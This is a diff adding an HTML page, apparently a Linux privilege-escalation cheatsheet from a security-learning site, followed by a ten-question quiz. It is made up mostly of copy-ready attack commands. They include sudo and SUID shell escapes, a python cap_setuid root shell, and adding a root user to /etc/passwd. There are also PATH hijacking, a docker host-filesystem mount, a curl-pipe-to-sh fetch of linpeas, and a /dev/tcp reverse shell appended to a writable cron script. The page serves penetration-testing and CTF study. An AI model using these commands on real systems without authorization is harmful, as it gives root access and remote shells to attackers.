@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Linux Privilege Escalation Cheatsheet — learn.niklas-heringer.com</title>
+<meta name="description" content="Complete Linux privilege escalation cheatsheet: SUID, sudo misconfigs, capabilities, cron jobs, writable paths, kernel exploits. With interactive quiz.">
+<meta name="author" content="Niklas Heringer">
+<link rel="canonical" href="https://learn.niklas-heringer.com/privilege-escalation/">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#080f1a;--bg2:#0d1b2e;--bg3:#0f2744;--border:#1e3a5f;
+    --accent:#ef4444;--accent2:#f97316;--text:#e2e8f0;
+    --muted:#64748b;--muted2:#94a3b8;
+    --mono:'JetBrains Mono',monospace;--sans:'DM Sans',sans-serif;
+    --green:#22c55e;--yellow:#fbbf24;--red:#ef4444;
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;line-height:1.7}
+  body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(239,68,68,0.02) 1px,transparent 1px),linear-gradient(90deg,rgba(239,68,68,0.02) 1px,transparent 1px);background-size:48px 48px;pointer-events:none;z-index:0}
+
+  nav{border-bottom:1px solid var(--border);background:rgba(8,15,26,0.9);backdrop-filter:blur(12px);position:sticky;top:0;z-index:100}
+  .nav-inner{display:flex;align-items:center;justify-content:space-between;padding:12px 24px;max-width:900px;margin:0 auto}
+  .nav-logo{font-family:var(--mono);font-size:12px;color:var(--muted);text-decoration:none}
+  .nav-logo span{color:var(--accent)}
+  .nav-back{font-family:var(--mono);font-size:11px;color:var(--muted);text-decoration:none;border:1px solid var(--border);padding:4px 12px;border-radius:6px;transition:.2s}
+  .nav-back:hover{color:var(--accent);border-color:var(--accent)}
+
+  .wrap{position:relative;z-index:1;max-width:900px;margin:0 auto;padding:0 24px 80px}
+
+  .hero{padding:48px 0 40px}
+  .breadcrumb{font-family:var(--mono);font-size:11px;color:var(--muted);margin-bottom:16px}
+  .breadcrumb a{color:var(--muted);text-decoration:none}
+  .breadcrumb a:hover{color:var(--accent)}
+  .hero-tag{display:inline-flex;align-items:center;gap:6px;font-family:var(--mono);font-size:10px;text-transform:uppercase;letter-spacing:.1em;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);color:#f87171;padding:3px 10px;border-radius:20px;margin-bottom:16px}
+  h1{font-family:var(--mono);font-size:clamp(22px,4vw,36px);font-weight:700;letter-spacing:-.03em;margin-bottom:12px;line-height:1.15}
+  .subtitle{color:var(--muted2);font-size:16px;font-weight:300;max-width:600px;margin-bottom:24px}
+  .meta-row{display:flex;gap:16px;flex-wrap:wrap;font-family:var(--mono);font-size:11px;color:var(--muted)}
+  .meta-badge{background:var(--bg2);border:1px solid var(--border);padding:3px 10px;border-radius:6px}
+
+  /* ── SECTIONS ── */
+  .section{margin-bottom:40px}
+  .section-title{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:.08em;margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid rgba(239,68,68,0.2);display:flex;align-items:center;gap:8px}
+  .section-title::before{content:'';display:block;width:3px;height:14px;background:var(--accent);border-radius:2px}
+
+  /* ── CODE BLOCKS ── */
+  .cmd-grid{display:grid;gap:8px}
+  .cmd{background:var(--bg2);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+  .cmd-header{padding:6px 14px;background:var(--bg3);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
+  .cmd-label{font-family:var(--mono);font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}
+  .cmd-copy{font-family:var(--mono);font-size:10px;color:var(--muted);cursor:pointer;background:none;border:none;padding:0;transition:.2s}
+  .cmd-copy:hover{color:var(--accent)}
+  .cmd code{display:block;padding:12px 14px;font-family:var(--mono);font-size:12px;color:#e2e8f0;white-space:pre;overflow-x:auto;line-height:1.6}
+  .cmd code .c{color:#64748b} /* comment */
+  .cmd code .kw{color:#f97316} /* keyword */
+  .cmd code .str{color:#4ade80} /* string/path */
+  .cmd code .flag{color:#7dd3fc} /* flag */
+
+  /* ── CONCEPT CARDS ── */
+  .concept-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
+  .concept{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:16px;border-left:3px solid var(--accent)}
+  .concept h3{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--text);margin-bottom:6px}
+  .concept p{font-size:12px;color:var(--muted2);line-height:1.5}
+  .concept .risk{display:inline-block;font-family:var(--mono);font-size:10px;padding:1px 7px;border-radius:4px;margin-top:8px}
+  .risk-high{background:rgba(239,68,68,0.1);color:#f87171}
+  .risk-med {background:rgba(251,191,36,0.1);color:#fbbf24}
+  .risk-low {background:rgba(34,197,94,0.1);color:#4ade80}
+
+  /* ── TABLE ── */
+  .table-wrap{overflow-x:auto;border-radius:8px;border:1px solid var(--border)}
+  table{width:100%;border-collapse:collapse;font-size:12px}
+  thead{background:var(--bg3)}
+  th{padding:10px 14px;text-align:left;font-family:var(--mono);font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-weight:600;border-bottom:1px solid var(--border)}
+  td{padding:10px 14px;border-bottom:1px solid rgba(30,58,95,0.5);vertical-align:top}
+  tr:last-child td{border-bottom:none}
+  tr:hover td{background:rgba(14,165,233,0.03)}
+  td:first-child{font-family:var(--mono);color:#7dd3fc;font-size:11px}
+  td:last-child{color:var(--muted2)}
+
+  /* ── QUIZ ── */
+  #quiz-section{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:32px;margin-top:56px}
+  .quiz-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
+  .quiz-header h2{font-family:var(--mono);font-size:18px;font-weight:700;color:var(--text)}
+  .quiz-progress-wrap{display:flex;align-items:center;gap:12px}
+  .quiz-progress-bar{width:160px;height:4px;background:var(--bg3);border-radius:2px;overflow:hidden}
+  .quiz-progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:2px;transition:width .4s ease}
+  .quiz-progress-text{font-family:var(--mono);font-size:11px;color:var(--muted)}
+
+  .question{display:none}
+  .question.active{display:block;animation:fadeIn .3s ease}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+  .q-num{font-family:var(--mono);font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:10px}
+  .q-text{font-size:15px;font-weight:500;color:var(--text);margin-bottom:20px;line-height:1.5}
+  .q-code{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:10px 14px;font-family:var(--mono);font-size:12px;color:#e2e8f0;margin-bottom:16px;white-space:pre;overflow-x:auto}
+
+  .options{display:grid;gap:8px}
+  .option{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:12px 16px;cursor:pointer;font-size:13px;color:var(--muted2);transition:.2s;text-align:left;width:100%;font-family:var(--sans);display:flex;align-items:center;gap:10px}
+  .option:hover:not(:disabled){border-color:var(--accent);color:var(--text);background:rgba(239,68,68,0.05)}
+  .option .opt-key{font-family:var(--mono);font-size:10px;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:1px 7px;color:var(--muted);flex-shrink:0}
+  .option.correct{border-color:var(--green)!important;background:rgba(34,197,94,0.08)!important;color:#4ade80!important}
+  .option.wrong  {border-color:var(--red)!important;  background:rgba(239,68,68,0.08)!important; color:#f87171!important}
+  .option:disabled{cursor:default}
+
+  .explanation{margin-top:16px;padding:14px;background:rgba(14,165,233,0.05);border:1px solid rgba(14,165,233,0.15);border-radius:8px;font-size:13px;color:var(--muted2);display:none;line-height:1.6}
+  .explanation.show{display:block;animation:fadeIn .3s ease}
+  .explanation strong{color:#7dd3fc}
+
+  .quiz-nav{display:flex;align-items:center;justify-content:space-between;margin-top:24px}
+  .btn{font-family:var(--mono);font-size:12px;font-weight:600;padding:10px 20px;border-radius:8px;cursor:pointer;border:none;transition:.2s}
+  .btn-primary{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff}
+  .btn-primary:hover{opacity:.9;transform:translateY(-1px)}
+  .btn-ghost{background:var(--bg3);color:var(--muted);border:1px solid var(--border)}
+  .btn-ghost:hover{color:var(--text);border-color:var(--accent)}
+  .btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
+
+  .quiz-result{text-align:center;padding:16px 0;display:none}
+  .result-score{font-family:var(--mono);font-size:52px;font-weight:700;color:var(--accent);display:block;margin-bottom:8px}
+  .result-msg{font-size:16px;color:var(--muted2);margin-bottom:24px}
+
+  .blog-cta{border-top:1px solid var(--border);margin-top:48px;padding-top:32px;text-align:center}
+  .blog-cta p{color:var(--muted2);font-size:14px;margin-bottom:16px}
+  .cta-link{display:inline-block;font-family:var(--mono);font-size:12px;font-weight:600;padding:10px 24px;border-radius:8px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;text-decoration:none;transition:.2s}
+  .cta-link:hover{opacity:.9;transform:translateY(-1px)}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a class="nav-logo" href="/"><span>learn</span>.niklas-heringer.com</a>
+    <a class="nav-back" href="/">← all sheets</a>
+  </div>
+</nav>
+
+<div class="wrap">
+  <div class="hero">
+    <div class="breadcrumb"><a href="/">home</a> / privilege-escalation</div>
+    <div class="hero-tag">🔺 privilege escalation</div>
+    <h1>Linux Privesc Cheatsheet</h1>
+    <p class="subtitle">The full methodology — SUID, sudo, capabilities, cron, writable paths, and kernel exploits. Commands you'll actually use.</p>
+    <div class="meta-row">
+      <span class="meta-badge">32 techniques</span>
+      <span class="meta-badge">10 quiz questions</span>
+      <span class="meta-badge difficulty">medium difficulty</span>
+      <span class="meta-badge">by <a href="https://niklas-heringer.com" style="color:var(--accent);text-decoration:none">niklas-heringer.com</a></span>
+    </div>
+  </div>
+
+  <!-- ENUMERATION -->
+  <div class="section">
+    <div class="section-title">initial enumeration</div>
+    <div class="cmd-grid">
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">system info</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code><span class="c"># Basic system recon</span>
+id && whoami && hostname
+uname -a
+cat /etc/os-release
+cat /proc/version</code>
+      </div>
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">quick wins — automated</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code><span class="c"># Upload and run linpeas</span>
+curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+<span class="c"># Or LinEnum</span>
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh && ./LinEnum.sh</code>
+      </div>
+    </div>
+  </div>
+
+  <!-- SUDO -->
+  <div class="section">
+    <div class="section-title">sudo misconfigurations</div>
+    <div class="cmd-grid">
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">enumerate sudo</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code>sudo -l
+<span class="c"># Look for NOPASSWD entries or specific binaries</span>
+<span class="c"># Cross-reference at: https://gtfobins.github.io</span></code>
+      </div>
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">common sudo escapes</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code><span class="c"># vim / vi</span>
+sudo vim -c ':!bash'
+
+<span class="c"># less / man</span>
+sudo less /etc/passwd   <span class="c"># then: !/bin/bash</span>
+
+<span class="c"># find</span>
+sudo find . -exec /bin/bash \; -quit
+
+<span class="c"># awk</span>
+sudo awk 'BEGIN {system("/bin/bash")}'
+
+<span class="c"># python</span>
+sudo python3 -c 'import os; os.system("/bin/bash")'</code>
+      </div>
+    </div>
+  </div>
+
+  <!-- SUID -->
+  <div class="section">
+    <div class="section-title">SUID / SGID binaries</div>
+    <div class="cmd-grid">
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">find SUID binaries</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code>find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+<span class="c"># SGID</span>
+find / -perm -2000 -type f 2>/dev/null
+
+<span class="c"># Both</span>
+find / -perm /6000 -type f 2>/dev/null</code>
+      </div>
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">useful SUID exploits</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code><span class="c"># bash (if SUID)</span>
+/bin/bash -p
+
+<span class="c"># cp — overwrite /etc/passwd</span>
+openssl passwd -1 -salt hack password123
+echo 'root2:$1$hack$...:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+<span class="c"># nmap (older versions)</span>
+nmap --interactive
+nmap> !sh</code>
+      </div>
+    </div>
+  </div>
+
+  <!-- CAPABILITIES -->
+  <div class="section">
+    <div class="section-title">capabilities</div>
+    <div class="cmd-grid">
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">find capabilities</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code>getcap -r / 2>/dev/null
+
+<span class="c"># Dangerous capabilities to look for:</span>
+<span class="c"># cap_setuid    → set UID to 0</span>
+<span class="c"># cap_net_raw   → raw socket access</span>
+<span class="c"># cap_dac_override → bypass file permissions</span></code>
+      </div>
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">python cap_setuid exploit</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code><span class="c"># If python3 has cap_setuid+ep</span>
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code>
+      </div>
+    </div>
+  </div>
+
+  <!-- CRON -->
+  <div class="section">
+    <div class="section-title">cron job abuse</div>
+    <div class="cmd-grid">
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">enumerate cron</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code>cat /etc/crontab
+cat /etc/cron.d/*
+ls -la /var/spool/cron/crontabs/
+crontab -l
+
+<span class="c"># Monitor what runs (pspy)</span>
+./pspy64   <span class="c"># github.com/DominicBreuker/pspy</span></code>
+      </div>
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">writable cron script exploit</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code><span class="c"># If a cron script is world-writable:</span>
+echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' >> /path/to/cron/script.sh
+
+<span class="c"># Or add SUID to bash:</span>
+echo 'chmod +s /bin/bash' >> /path/to/cron/script.sh
+<span class="c"># Then: bash -p</span></code>
+      </div>
+    </div>
+  </div>
+
+  <!-- WRITABLE FILES -->
+  <div class="section">
+    <div class="section-title">writable paths & files</div>
+    <div class="cmd-grid">
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">find writable files</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code><span class="c"># World-writable files</span>
+find / -writable -type f 2>/dev/null | grep -v proc
+
+<span class="c"># Writable directories</span>
+find / -writable -type d 2>/dev/null
+
+<span class="c"># Check /etc/passwd writable</span>
+ls -la /etc/passwd /etc/shadow /etc/sudoers</code>
+      </div>
+      <div class="cmd">
+        <div class="cmd-header"><span class="cmd-label">PATH hijacking</span><button class="cmd-copy" onclick="copy(this)">copy</button></div>
+        <code><span class="c"># If a SUID binary calls a command without full path</span>
+strings /usr/bin/suid-binary | grep -v '/'
+
+<span class="c"># Create malicious binary in writable dir</span>
+echo '/bin/bash' > /tmp/curl
+chmod +x /tmp/curl
+export PATH=/tmp:$PATH
+./suid-binary</code>
+      </div>
+    </div>
+  </div>
+
+  <!-- QUICK REFERENCE TABLE -->
+  <div class="section">
+    <div class="section-title">quick reference — vectors</div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Vector</th><th>Check</th><th>Exploit path</th><th>Risk</th></tr></thead>
+        <tbody>
+          <tr><td>sudo -l</td><td>Any NOPASSWD entries</td><td>GTFOBins shell escape</td><td><span style="color:#f87171">critical</span></td></tr>
+          <tr><td>SUID bash</td><td>find / -perm -4000</td><td>bash -p</td><td><span style="color:#f87171">critical</span></td></tr>
+          <tr><td>Writable /etc/passwd</td><td>ls -la /etc/passwd</td><td>Add root user manually</td><td><span style="color:#f87171">critical</span></td></tr>
+          <tr><td>cap_setuid</td><td>getcap -r / 2>/dev/null</td><td>python3 os.setuid(0)</td><td><span style="color:#f87171">critical</span></td></tr>
+          <tr><td>Writable cron script</td><td>pspy + ls -la</td><td>Append reverse shell</td><td><span style="color:#fbbf24">high</span></td></tr>
+          <tr><td>PATH hijacking</td><td>strings on SUID bins</td><td>Fake binary in $PATH</td><td><span style="color:#fbbf24">high</span></td></tr>
+          <tr><td>Kernel exploit</td><td>uname -a → searchsploit</td><td>Compile & run PoC</td><td><span style="color:#fbbf24">high</span></td></tr>
+          <tr><td>Docker group</td><td>id | grep docker</td><td>docker run -v /:/mnt alpine</td><td><span style="color:#f87171">critical</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- QUIZ -->
+  <div id="quiz-section">
+    <div class="quiz-header">
+      <h2>// quiz — test yourself</h2>
+      <div class="quiz-progress-wrap">
+        <div class="quiz-progress-bar"><div class="quiz-progress-fill" id="progress-fill" style="width:10%"></div></div>
+        <span class="quiz-progress-text" id="progress-text">1 / 10</span>
+      </div>
+    </div>
+
+    <div id="questions-wrap"></div>
+    <div class="quiz-result" id="quiz-result">
+      <span class="result-score" id="result-score"></span>
+      <p class="result-msg" id="result-msg"></p>
+      <button class="btn btn-primary" onclick="resetQuiz()">try again</button>
+    </div>
+
+    <div class="quiz-nav" id="quiz-nav">
+      <span class="quiz-progress-text" id="score-display">score: 0</span>
+      <button class="btn btn-primary" id="next-btn" onclick="nextQ()" disabled>next →</button>
+    </div>
+  </div>
+
+  <div class="blog-cta">
+    <p>Want deeper writeups with real HTB machines using these techniques?</p>
+    <a class="cta-link" href="https://niklas-heringer.com/tags/privilegeescalation/" target="_blank">read the blog posts →</a>
+  </div>
+</div>
+
+<script>
+const qs = [
+  {
+    q: "Which command finds all SUID binaries on the system?",
+    code: null,
+    opts: [
+      "find / -perm -4000 -type f 2>/dev/null",
+      "ls -la / | grep suid",
+      "find / -suid -exec ls {} \\;",
+      "chmod +s / -R --list"
+    ],
+    ans: 0,
+    exp: "<strong>find / -perm -4000</strong> searches for files with the SUID bit set. <code>2>/dev/null</code> suppresses permission errors. Always cross-reference results with GTFOBins."
+  },
+  {
+    q: "You find this in sudo -l. How do you escalate?",
+    code: "(root) NOPASSWD: /usr/bin/find",
+    opts: [
+      "sudo find / -name root",
+      "sudo find . -exec /bin/bash \\; -quit",
+      "sudo find -perm 0777 /bin/bash",
+      "sudo find / -user root -exec id \\;"
+    ],
+    ans: 1,
+    exp: "<strong>sudo find . -exec /bin/bash \\; -quit</strong> uses find's -exec flag to spawn a shell as root. This is one of the classic GTFOBins escapes."
+  },
+  {
+    q: "What does 'bash -p' do when bash has the SUID bit set?",
+    code: null,
+    opts: [
+      "Runs bash with a custom prompt",
+      "Starts bash in privileged mode, preserving the effective UID (root)",
+      "Runs bash as the owner of the file",
+      "Enables bash debug mode"
+    ],
+    ans: 1,
+    exp: "The <strong>-p flag</strong> prevents bash from dropping privileges when the real and effective UIDs differ. Without it, bash resets to your real UID even when SUID is set."
+  },
+  {
+    q: "Which capability allows a binary to change its UID to 0 (root)?",
+    code: null,
+    opts: ["cap_net_raw", "cap_dac_override", "cap_setuid", "cap_sys_admin"],
+    ans: 2,
+    exp: "<strong>cap_setuid</strong> allows a process to set arbitrary UIDs. Combined with python3, this is trivially exploitable: <code>python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'</code>"
+  },
+  {
+    q: "You find a cron job running as root every minute. What tool would you use to discover it without root access?",
+    code: null,
+    opts: ["crontab -l", "pspy64", "cat /var/spool/cron", "systemctl list-timers"],
+    ans: 1,
+    exp: "<strong>pspy</strong> monitors process creation without root privileges by reading from /proc. It's the go-to tool for catching cron jobs and other scheduled tasks running as different users."
+  },
+  {
+    q: "What does this command attempt to do?",
+    code: "echo 'chmod +s /bin/bash' >> /opt/backup.sh",
+    opts: [
+      "Create a backup of /bin/bash",
+      "Append a command to set SUID on bash — exploiting a writable cron script",
+      "Remove SUID from bash",
+      "Schedule bash to run as root"
+    ],
+    ans: 1,
+    exp: "If <strong>/opt/backup.sh</strong> runs as root via cron and is world-writable, appending <code>chmod +s /bin/bash</code> will SUID bash the next time cron runs. Then <code>bash -p</code> gives root."
+  },
+  {
+    q: "How does PATH hijacking work against a SUID binary?",
+    code: null,
+    opts: [
+      "You modify the binary's source code",
+      "You create a malicious binary with the same name in a directory prepended to $PATH",
+      "You overwrite the system PATH variable permanently",
+      "You rename /usr/bin/sudo to exploit sudo"
+    ],
+    ans: 1,
+    exp: "If a SUID binary calls e.g. <code>curl</code> without a full path, the OS searches $PATH in order. Prepending a writable dir with your fake <code>curl</code> means your code runs as root."
+  },
+  {
+    q: "What is the risk of being in the 'docker' group on Linux?",
+    code: null,
+    opts: [
+      "You can pull private images only",
+      "You can restart the docker daemon",
+      "You can mount the host filesystem and escape to root",
+      "You have read access to container logs"
+    ],
+    ans: 2,
+    exp: "Docker group membership = root equivalent. <code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code> mounts the entire host filesystem into a container, giving full root access."
+  },
+  {
+    q: "You're checking capabilities and see this output. Is this exploitable?",
+    code: "/usr/bin/python3.9 = cap_setuid+ep",
+    opts: [
+      "No — cap_setuid only works for non-root users",
+      "Yes — +ep means effective and permitted, python3 can call os.setuid(0)",
+      "No — python cannot use capabilities",
+      "Only if python is also SUID"
+    ],
+    ans: 1,
+    exp: "<strong>+ep</strong> means the capability is both <em>effective</em> and <em>permitted</em> — it's active. Run: <code>python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'</code> to get root."
+  },
+  {
+    q: "What does 2>/dev/null do in find commands used for privesc enumeration?",
+    code: "find / -perm -4000 -type f 2>/dev/null",
+    opts: [
+      "Hides the output from the terminal",
+      "Redirects stderr (permission denied errors) to /dev/null, cleaning up output",
+      "Sends stdout to /dev/null",
+      "Doubles the output speed"
+    ],
+    ans: 1,
+    exp: "<strong>2>/dev/null</strong> redirects file descriptor 2 (stderr) to /dev/null. Without it, find floods the terminal with 'Permission denied' errors from directories we can't read, burying the useful results."
+  }
+];
+
+let cur = 0, score = 0, answered = false;
+
+function render() {
+  const wrap = document.getElementById('questions-wrap');
+  wrap.innerHTML = '';
+  const q = qs[cur];
+  const div = document.createElement('div');
+  div.className = 'question active';
+  div.innerHTML = `
+    <div class="q-num">question ${cur+1} of ${qs.length}</div>
+    <div class="q-text">${q.q}</div>
+    ${q.code ? `<div class="q-code">${q.code}</div>` : ''}
+    <div class="options">
+      ${q.opts.map((o,i) => `
+        <button class="option" onclick="pick(this,${i})" data-idx="${i}">
+          <span class="opt-key">${String.fromCharCode(65+i)}</span>
+          ${o}
+        </button>`).join('')}
+    </div>
+    <div class="explanation" id="exp">${q.exp}</div>
+  `;
+  wrap.appendChild(div);
+  document.getElementById('next-btn').disabled = true;
+  answered = false;
+  updateProgress();
+}
+
+function pick(el, idx) {
+  if (answered) return;
+  answered = true;
+  const q = qs[cur];
+  const opts = document.querySelectorAll('.option');
+  opts.forEach(o => o.disabled = true);
+  if (idx === q.ans) {
+    el.classList.add('correct');
+    score++;
+  } else {
+    el.classList.add('wrong');
+    opts[q.ans].classList.add('correct');
+  }
+  document.getElementById('exp').classList.add('show');
+  document.getElementById('next-btn').disabled = false;
+  document.getElementById('score-display').textContent = `score: ${score}`;
+}
+
+function nextQ() {
+  cur++;
+  if (cur >= qs.length) {
+    showResult();
+  } else {
+    render();
+  }
+}
+
+function showResult() {
+  document.getElementById('questions-wrap').style.display = 'none';
+  document.getElementById('quiz-nav').style.display = 'none';
+  const res = document.getElementById('quiz-result');
+  res.style.display = 'block';
+  const pct = Math.round((score/qs.length)*100);
+  document.getElementById('result-score').textContent = `${score}/${qs.length}`;
+  document.getElementById('result-msg').textContent =
+    pct >= 80 ? "solid — you know your privesc fundamentals." :
+    pct >= 50 ? "decent start — review the sections you missed." :
+    "keep grinding — read the blog posts and come back.";
+  document.getElementById('progress-fill').style.width = '100%';
+}
+
+function resetQuiz() {
+  cur = 0; score = 0; answered = false;
+  document.getElementById('questions-wrap').style.display = 'block';
+  document.getElementById('quiz-nav').style.display = 'flex';
+  document.getElementById('quiz-result').style.display = 'none';
+  document.getElementById('score-display').textContent = 'score: 0';
+  render();
+}
+
+function updateProgress() {
+  const pct = ((cur+1)/qs.length)*100;
+  document.getElementById('progress-fill').style.width = pct+'%';
+  document.getElementById('progress-text').textContent = `${cur+1} / ${qs.length}`;
+}
+
+function copy(btn) {
+  const code = btn.closest('.cmd').querySelector('code').innerText;
+  navigator.clipboard.writeText(code).then(() => {
+    btn.textContent = 'copied!';
+    setTimeout(() => btn.textContent = 'copy', 1500);
+  });
+}
+
+render();
+</script>
+</body>
+</html>
